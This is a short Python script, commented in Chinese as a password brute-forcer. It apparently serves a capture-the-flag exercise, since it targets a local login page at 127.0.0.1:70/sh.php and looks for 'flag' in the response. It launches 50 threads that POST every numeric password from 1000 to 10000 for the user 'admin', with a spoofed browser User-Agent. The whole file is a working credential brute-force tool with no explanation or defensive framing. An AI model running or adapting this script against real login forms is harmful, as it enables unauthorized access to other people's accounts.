import requests, threading

class bruteForce:
	"""密码爆破"""
	def __init__(self,start,end) -> None:
		self.start = start
		self.end = end

	def createThreads(self, total):
		step = int((self.end - self.start) / total)
		threadsList = []
		for i in range(total):
			try:
				t = threading.Thread(
					target=self.run, 
					args=(self.start+ i*step, self.start + (i+1)*step)
				)
				t.start() 
				threadsList.append(t)
			except:
				print("Error: unable to start thread")
		for t in threadsList:
			t.join()

	def run(self,start,end):
		begin =start
		while begin <=end:
			req = requests.post('http://127.0.0.1:70/sh.php', 
				data={
					'username':'admin',
					'password':f'{begin}'
				},
				headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0'}
			)
			if 'flag' in req.text:
				print('Password is :',begin)
				break
			begin += 1
		print(threading.current_thread().name, '线程结束')
	
if __name__ == '__main__':
	BP = bruteForce(1000,10000)
	BP.createThreads(50)
	print('子线程全部结束')
	